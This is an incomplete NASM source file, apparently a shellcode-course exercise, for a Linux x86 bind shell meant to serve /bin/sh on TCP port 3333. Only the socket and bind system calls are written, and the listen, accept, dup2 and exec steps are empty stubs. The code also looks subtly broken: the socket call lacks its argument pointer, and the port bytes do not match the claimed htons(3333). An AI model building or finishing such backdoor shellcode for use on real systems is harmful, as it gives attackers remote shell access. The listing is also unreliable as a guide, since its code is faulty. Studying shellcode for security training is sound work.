; Filename: ShellBindTcp.nasm
; Author:  SLAE-935
;
; Purpose: spawn /bin/sh on tcp port handling multiple connections

global _start			

section .text
_start:

    ; Socket
    ; soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
    xor eax, eax ; clean 0x00 bytes
    mov eax, 102 ; kernel socket_call

    xor ebx, ebx ; clean 0x00 bytes
    mov ebx, 1 ; SYS_SOCKET	1

    ; The stack grows from high memory to low memory, thus args needs to be pushed in reverse order
    push 6 ; IPPROTO_TCP
    push 1 ; SOCK_STREAM
    push 2 ; AF_INET

    int 0x80 ; ret value (socket descriptor) in eax (as most of assembly system calls)

    mov edx, eax ; save socket descriptor in edx

    ; Bind
    ; bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));

    mov eax, 102 ; kernel socket_call
    mov ebx, 2 ; SYS_BIND 2

    ; Stack H -> L
    push 1 ; SOCK_STREAM
    push 2 ; AF_INET

    ; build sockaddr_in structure
    ; by definition
    ; struct sockaddr_in {
    ;   short            sin_family;   // AF_INET -> 2 bytes
    ;   unsigned short   sin_port;     // 2 bytes
    ;   struct in_addr   sin_addr;     // see struct in_addr, below
    ;   char             sin_zero[8];  // 8 bytes
    ; };
    ;   
    ;   struct in_addr {
    ;       unsigned long s_addr;  // 4 bytes
    ;   };
    ;
    ; shellcode usage:
    ; serv_addr.sin_family = AF_INET; 
    ; serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    ; serv_addr.sin_port = htons(BIND_PORT); 

    ; Reverse pushing
    push 0 ; htonl(INADDR_ANY)
    push WORD 0x0D05 ; htons(3333) -> word = 2bytes
    push WORD 2; AF_INET -> word = 2bytes

    mov ecx, esp ; pointer to struct sockaddr_in serv_addr

    ; push args
    push 16 ; sizeof(sin_family (2 bytes) + sin_port (2 bytes) + sin_addr (4 bytes) + sin_zero (8 bytes))
    push ecx ; (struct sockaddr *) &serv_addr
    push edx ; soc_des

    int 0x80 ;

    ; Listen

    ; Accept

    ; Dup2

    ; Execl

    ; Todo: add forks and signal bypass